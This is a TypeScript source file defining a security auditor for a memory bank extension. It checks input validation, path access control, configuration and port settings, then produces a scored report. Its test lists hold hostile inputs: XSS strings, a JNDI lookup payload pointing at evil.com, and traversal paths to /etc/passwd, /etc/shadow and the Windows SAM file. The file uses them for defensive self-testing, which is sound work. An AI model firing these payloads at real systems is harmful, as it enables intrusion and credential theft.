/**
 * Security audit and monitoring system
 * Implements comprehensive security checks and monitoring for the memory bank system
 */

import { PlatformInterface } from '../platform-interface';
import { SecurityConfig, SecurityError, MemoryBankError } from '../types';
import { InputValidator } from './input-validator';
import { AccessControl } from './access-control';
import * as crypto from 'crypto';

export interface SecurityAuditResult {
  passed: boolean;
  score: number; // 0-100
  findings: SecurityFinding[];
  recommendations: string[];
}

export interface SecurityFinding {
  severity: 'low' | 'medium' | 'high' | 'critical';
  category: 'input_validation' | 'access_control' | 'data_integrity' | 'configuration' | 'network';
  description: string;
  details: string;
  remediation: string;
}

/**
 * Comprehensive security audit system
 */
export class SecurityAuditor {
  private platform: PlatformInterface;
  private config: SecurityConfig;
  private accessControl: AccessControl;
  
  constructor(platform: PlatformInterface, config: SecurityConfig, accessControl: AccessControl) {
    this.platform = platform;
    this.config = config;
    this.accessControl = accessControl;
  }
  
  /**
   * Perform comprehensive security audit
   */
  async performSecurityAudit(): Promise<SecurityAuditResult> {
    const findings: SecurityFinding[] = [];
    
    try {
      // Input validation audit
      findings.push(...await this.auditInputValidation());
      
      // Access control audit
      findings.push(...await this.auditAccessControl());
      
      // Data integrity audit
      findings.push(...await this.auditDataIntegrity());
      
      // Configuration security audit
      findings.push(...await this.auditConfiguration());
      
      // Network security audit
      findings.push(...await this.auditNetworkSecurity());
      
      // Calculate security score
      const score = this.calculateSecurityScore(findings);
      
      // Generate recommendations
      const recommendations = this.generateRecommendations(findings);
      
      const result: SecurityAuditResult = {
        passed: score >= 80 && !findings.some(f => f.severity === 'critical'),
        score,
        findings,
        recommendations
      };
      
      this.platform.log('info', `Security audit completed. Score: ${score}/100, Findings: ${findings.length}`);
      
      return result;
      
    } catch (error) {
      this.platform.log('error', 'Security audit failed:', error);
      throw new SecurityError(`Security audit failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
    }
  }
  
  /**
   * Audit input validation mechanisms
   */
  private async auditInputValidation(): Promise<SecurityFinding[]> {
    const findings: SecurityFinding[] = [];
    
    // Test malicious input patterns
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      'javascript:alert("xss")',
      '../../etc/passwd',
      '${jndi:ldap://evil.com/a}',
      'SELECT * FROM users',
      '\x00\x01\x02',
      'a'.repeat(2000000) // Large input
    ];
    
    for (const input of maliciousInputs) {
      const validation = InputValidator.validateMemoryBankContent(input);
      if (validation.isValid) {
        findings.push({
          severity: 'high',
          category: 'input_validation',
          description: 'Malicious input not properly validated',
          details: `Input "${input.substring(0, 50)}..." was accepted`,
          remediation: 'Strengthen input validation rules'
        });
      }
    }
    
    // Check if content sanitization is enabled
    if (!this.config.enableContentSanitization) {
      findings.push({
        severity: 'medium',
        category: 'input_validation',
        description: 'Content sanitization is disabled',
        details: 'Content sanitization provides additional protection against malicious content',
        remediation: 'Enable content sanitization in configuration'
      });
    }
    
    return findings;
  }
  
  /**
   * Audit access control mechanisms
   */
  private async auditAccessControl(): Promise<SecurityFinding[]> {
    const findings: SecurityFinding[] = [];
    
    // Test directory traversal protection
    const traversalPaths = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/etc/shadow',
      'C:\\Windows\\System32\\config\\SAM'
    ];
    
    const workspaceRoot = this.platform.getWorkspaceRoot();
    if (workspaceRoot) {
      for (const testPath of traversalPaths) {
        if (this.accessControl.canAccessPath(testPath)) {
          findings.push({
            severity: 'critical',
            category: 'access_control',
            description: 'Directory traversal vulnerability detected',
            details: `Path "${testPath}" is accessible`,
            remediation: 'Implement proper path validation and access controls'
          });
        }
      }
    }
    
    // Check if allowed paths are properly restricted
    const securityContext = this.accessControl.getSecurityContext();
    if (securityContext.allowedPaths.length === 0) {
      findings.push({
        severity: 'high',
        category: 'access_control',
        description: 'No access path restrictions configured',
        details: 'System allows access to any path',
        remediation: 'Configure specific allowed paths'
      });
    }
    
    // Check file extension restrictions
    if (securityContext.allowedExtensions.includes('*') || securityContext.allowedExtensions.length === 0) {
      findings.push({
        severity: 'medium',
        category: 'access_control',
        description: 'File extension restrictions too permissive',
        details: 'System allows all file extensions',
        remediation: 'Restrict to specific safe file extensions'
      });
    }
    
    return findings;
  }
  
  /**
   * Audit data integrity mechanisms
   */
  private async auditDataIntegrity(): Promise<SecurityFinding[]> {
    const findings: SecurityFinding[] = [];
    
    // Check if checksums are being used
    try {
      const testContent = 'test content for integrity check';
      const hash1 = crypto.createHash('sha256').update(testContent).digest('hex');
      const hash2 = crypto.createHash('sha256').update(testContent).digest('hex');
      
      if (hash1 !== hash2) {
        findings.push({
          severity: 'high',
          category: 'data_integrity',
          description: 'Checksum calculation inconsistency',
          details: 'Hash function producing different results for same input',
          remediation: 'Fix checksum calculation implementation'
        });
      }
    } catch (error) {
      findings.push({
        severity: 'medium',
        category: 'data_integrity',
        description: 'Checksum calculation error',
        details: `Error calculating checksums: ${error instanceof Error ? error.message : 'Unknown error'}`,
        remediation: 'Implement proper checksum calculation'
      });
    }
    
    return findings;
  }
  
  /**
   * Audit configuration security
   */
  private async auditConfiguration(): Promise<SecurityFinding[]> {
    const findings: SecurityFinding[] = [];
    
    // Check file size limits
    if (this.config.maxFileSize > 10 * 1024 * 1024) { // 10MB
      findings.push({
        severity: 'medium',
        category: 'configuration',
        description: 'File size limit too high',
        details: `Maximum file size is ${this.config.maxFileSize} bytes`,
        remediation: 'Reduce maximum file size to prevent DoS attacks'
      });
    }
    
    // Check if logging is enabled
    const loggingConfig = this.platform.getConfiguration('aimemory');
    if (!loggingConfig.get('enableLogging', true)) {
      findings.push({
        severity: 'low',
        category: 'configuration',
        description: 'Security logging is disabled',
        details: 'Logging helps with security monitoring and incident response',
        remediation: 'Enable security logging'
      });
    }
    
    return findings;
  }
  
  /**
   * Audit network security
   */
  private async auditNetworkSecurity(): Promise<SecurityFinding[]> {
    const findings: SecurityFinding[] = [];
    
    // Check if server is bound to localhost only
    const serverConfig = this.platform.getConfiguration('aimemory');
    const serverPort = serverConfig.get('serverPort', 7331);
    
    if (serverPort < 1024) {
      findings.push({
        severity: 'medium',
        category: 'network',
        description: 'Server using privileged port',
        details: `Server port ${serverPort} requires elevated privileges`,
        remediation: 'Use unprivileged port (>= 1024)'
      });
    }
    
    // Note: In a real implementation, you would check if the server is properly bound to localhost
    // and not accessible from external networks
    
    return findings;
  }
  
  /**
   * Calculate overall security score
   */
  private calculateSecurityScore(findings: SecurityFinding[]): number {
    let score = 100;
    
    for (const finding of findings) {
      switch (finding.severity) {
        case 'critical':
          score -= 25;
          break;
        case 'high':
          score -= 15;
          break;
        case 'medium':
          score -= 8;
          break;
        case 'low':
          score -= 3;
          break;
      }
    }
    
    return Math.max(0, score);
  }
  
  /**
   * Generate security recommendations
   */
  private generateRecommendations(findings: SecurityFinding[]): string[] {
    const recommendations = new Set<string>();
    
    // Add specific recommendations based on findings
    for (const finding of findings) {
      recommendations.add(finding.remediation);
    }
    
    // Add general security recommendations
    recommendations.add('Regularly update dependencies to patch security vulnerabilities');
    recommendations.add('Implement rate limiting to prevent abuse');
    recommendations.add('Use HTTPS for all network communications');
    recommendations.add('Implement proper session management');
    recommendations.add('Regular security audits and penetration testing');
    
    return Array.from(recommendations);
  }
  
  /**
   * Generate security report
   */
  generateSecurityReport(auditResult: SecurityAuditResult): string {
    const report = `# Security Audit Report

## Overall Assessment
- **Security Score**: ${auditResult.score}/100
- **Status**: ${auditResult.passed ? 'PASSED' : 'FAILED'}
- **Total Findings**: ${auditResult.findings.length}

## Findings by Severity
- **Critical**: ${auditResult.findings.filter(f => f.severity === 'critical').length}
- **High**: ${auditResult.findings.filter(f => f.severity === 'high').length}
- **Medium**: ${auditResult.findings.filter(f => f.severity === 'medium').length}
- **Low**: ${auditResult.findings.filter(f => f.severity === 'low').length}

## Detailed Findings
${auditResult.findings.map(finding => `
### ${finding.severity.toUpperCase()}: ${finding.description}
- **Category**: ${finding.category}
- **Details**: ${finding.details}
- **Remediation**: ${finding.remediation}
`).join('\n')}

## Recommendations
${auditResult.recommendations.map(rec => `- ${rec}`).join('\n')}

## Generated
${new Date().toISOString()}
`;
    
    return report;
  }
}
